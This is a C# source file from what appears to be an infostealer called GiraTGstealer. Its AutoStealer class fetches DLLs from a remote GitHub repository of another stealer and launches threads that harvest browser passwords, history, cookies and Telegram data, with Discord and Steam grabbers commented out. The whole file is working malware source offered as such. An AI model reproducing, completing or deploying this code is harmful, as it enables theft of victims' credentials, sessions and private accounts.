using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using GiraTGstealer.stealer;

namespace GiraTGstealer
{
    internal class AutoStealer
    {
        public static Thread AutoStealerThread = new Thread(steal);
        private static string lockfile = Path.GetDirectoryName(config.InstallPath) + "\\autosteal.lock";

        public static void loadDlls()
        {
            core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/Sodium.dll");
            core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium.dll");
            core.LoadRemoteLibrary("https://raw.githubusercontent.com/LimerBoy/Adamantium-Thief/master/Stealer/Stealer/modules/libs/libsodium-64.dll");
        }

        private static void steal()
        {
            File.Create(lockfile);

            List<Thread> thread = new List<Thread>(){
                new Thread(Passwords.start),
                new Thread(History.start),
                new Thread(Cookies.start),
                new Thread(TelegramGrabber.get),
                //new Thread(DiscordGrabber.get),
                //new Thread(SteamGrabber.get)
            };
            Console.WriteLine("🌹 Starting autostealer...");
            foreach(Thread t in thread) 
            {
                t.Start();
            }
            while (!Cookies.complete)
            {
                Thread.Sleep(20 * 1000);
            }
            Console.WriteLine("🥀 Stopping autostealer...");
            foreach (Thread t in thread)
            {
                if(t.IsAlive)
                {
                    try
                    {
                        t.Abort();
                    }
                    catch (Exception ex){
                        Console.WriteLine(ex.ToString());
                    }
                }
            }
        }
    }
}
